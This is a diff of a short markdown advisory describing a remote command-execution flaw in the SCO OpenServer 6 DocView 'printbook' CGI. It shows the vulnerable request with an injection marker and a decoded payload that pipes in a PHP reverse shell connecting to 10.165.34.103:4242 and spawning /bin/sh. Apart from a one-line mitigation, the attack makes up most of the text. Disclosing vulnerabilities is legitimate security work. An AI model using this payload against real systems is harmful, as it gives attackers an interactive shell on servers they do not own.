@@ -1,6 +1,6 @@
 
-
-**Responsible Disclosure Was Attempted.**
+# SCO OpenServer 6 CGI Parameter Bypass RCE
+###**Responsible Disclosure Was Attempted.**
 
 
 It was discovered that the printbook functionality within the DocView CGI library was vulnerable to a pipe parameter bypass, allowing an attacker to execute arbitrary system commands.
@@ -12,7 +12,7 @@ Theres no official patch on fixing this however if you disable the DocView funct
 
 ![RCE Against SCO-OpenServer6](https://i.imgur.com/pzCZS3M.png)
 
-Affected parameter and URL decoded payload:
+###Affected parameter and URL decoded payload:
 
  - /cgi-bin/printbook?booktitle=216409&toclevels=1&part=%2fen%2fOSR_FEATS%2fCONTENTS.html&outputform=pdf[VULN]
  - || php -r '$sock=fsockopen("10.165.34.103",4242);exec("/bin/sh -i <&3 >&3 2>&3");' &
